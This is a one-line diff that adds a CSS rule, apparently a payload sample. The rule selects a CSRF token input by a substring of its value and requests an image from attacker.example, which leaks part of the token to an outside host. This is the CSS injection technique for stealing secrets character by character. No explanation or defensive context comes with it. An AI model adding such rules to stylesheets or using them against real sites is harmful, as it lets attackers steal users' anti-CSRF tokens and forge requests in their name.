@@ -1,0 +1,1 @@
+input[name="csrf_token"][value*="abc"] { list-style-image: url(https://attacker.example/abc); }
